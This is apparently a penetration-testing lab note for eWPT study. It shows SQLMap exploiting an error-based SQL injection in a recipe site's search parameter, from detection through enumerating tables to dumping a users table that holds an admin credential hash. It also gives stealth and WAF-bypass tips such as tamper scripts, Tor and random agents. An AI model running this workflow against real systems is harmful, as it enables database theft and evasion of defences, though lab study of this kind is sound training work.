2025-07-24 10:23

Status:

Tags: [[eWPT]] [[SQL Injection]]
###### Prerequisites: 


# Website to test and the request
## i first identified that its error based sql injection by manual testing then saved the request from burpsuite
![[Pics/Screenshot 2025-07-24 at 10.26.06 AM.png]]

![[Pics/Screenshot 2025-07-24 at 10.30.42 AM.png]]



## SQLMap Practical Guide and Workflow Error Based SQLI

**SQLMap** is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection (SQLi) vulnerabilities. This guide walks through a complete workflow using a captured HTTP request and explains the key options, outputs, and recommendations.

---

### 📄 Step 1: Using a Request File (`-r`)

You started by saving a raw HTTP POST request to a file named `request`. This is critical for cases where the injection is in POST data or behind login/auth flows.

```bash
sqlmap -r request -p words_exact --technique=E
```

**Flags explained**:

- `-r request`: Use the HTTP request file.
    
- `-p words_exact`: Target only the `words_exact` parameter.
    
- `--technique=E`: Use **error-based** SQLi detection only (faster when you know what works).
    

**Tips**:

- Ensure the request file contains a working and testable request (non-empty values).
    
- You can capture this using Burp Suite or browser DevTools → copy as cURL → convert to raw.
    

---

### 🧪 Output Analysis: Injection Discovery

```text
heuristic (basic) test shows that POST parameter 'words_exact' might be injectable
POST parameter 'words_exact' is 'MySQL >= 5.5 AND error-based [...]' injectable 
```

SQLMap automatically identified:

- The target backend DBMS: `MySQL >= 5.5`
    
- The injection technique: **Error-based**
    
- The exact payload used is shown for reference.
    

**Payload Example**:

```sql
words_exact=' IN BOOLEAN MODE) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(...)))))
```

---

### 📁 Session Resuming and Speed Tips

After the initial discovery, SQLMap stores sessions under:

```bash
/root/.local/share/sqlmap/output/<target_ip>/
```

To resume an existing session and avoid re-testing:

```bash
sqlmap -r request -p words_exact --technique=E --current-db
```

**What this does**:

- Resumes previous injection data.
    
- Quickly retrieves the current database in use.
    

---

### 📂 Listing Tables

Once the current database is known (`recipes` in your case), list its tables:

```bash
sqlmap -r request -p words_exact --technique=E -D recipes --tables
```

**Output**:

```text
Database: recipes
+--------------------+
| categories         |
| ingredients        |
| recipe_ingredients |
| recipes            |
| sessions           |
| units              |
| users              |
+--------------------+
```

---

### 🧨 Dumping Table Data

To extract full data from the `users` table:

```bash
sqlmap -r request -p words_exact --technique=E -D recipes -T users --dump
```

**Results**:

```text
+----+--------------------+-------+-------+----------+---------------+
| id | name               | privs | email | username | password      |
| 1  | phpMyRecipes Admin | 4096  | NULL  | recipes  | 6i1wgDRASJDhE |
+----+--------------------+-------+-------+----------+---------------+
```

The data is also saved as:

```
/root/.local/share/sqlmap/output/192.246.55.3/dump/recipes/users.csv
```

---

### ⚙️ Commonly Used SQLMap Options

|Option|Description|
|---|---|
|`--dbs`|Enumerate all available databases|
|`--current-user`|Get the DBMS current user|
|`--current-db`|Get the currently used database|
|`--is-dba`|Check if current user is DBA|
|`--tables -D <db>`|List all tables in a specific database|
|`--columns -D <db> -T <table>`|List all columns in a specific table|
|`--dump -D <db> -T <table>`|Dump full table data|
|`--batch`|Non-interactive mode (auto-confirm prompts)|
|`--threads=5`|Increase threads (default is 1)|
|`--level=5 --risk=3`|Extend test depth and payloads (more aggressive)|

---

### 🧠 Tips for Faster and Efficient Usage

- Use `--batch` for automation scripts or cron jobs.
    
- Add `--output-dir=/path/to/save` to control where results are saved.
    
- Use `--tamper` for WAF bypass (requires testing, can slow down).
    
- Save output and replay later: no need to rerun injection phase.
    
- Combine `--current-db`, `--tables`, and `--dump` in chained phases.
    

---

###  Warnings in Output

- `WARNING: your sqlmap version is outdated`: update regularly with `git pull` if using dev version.
    
- `WARNING: provided value for parameter 'words_exact' is empty`: add dummy values in the request like `words_exact=1` to avoid parsing errors.
    

---

### Legal Reminder

> Use only on **authorized** targets. SQLMap is a powerful tool, and unauthorized use can be illegal and unethical.

---

###  Example Workflow (Recap)

```bash
# Step 1: Test injection
sqlmap -r request -p words_exact --technique=E

# Step 2: Get DB info
sqlmap -r request -p words_exact --technique=E --current-db

# Step 3: List tables
sqlmap -r request -p words_exact --technique=E -D recipes --tables

# Step 4: Dump data
sqlmap -r request -p words_exact --technique=E -D recipes -T users --dump
```

---

###  Final Notes

- SQLMap handles a lot of work automatically, but always inspect payloads and logs.
    
- Make sure your request file is clean, complete, and uses realistic values.
    
- For stealth: look into `--random-agent`, `--delay`, `--tor`, `--proxy`.
    

---

Let me know if you want a **graphical cheat sheet**, **custom tamper scripts**, or **WAF bypassing techniques** using SQLMap.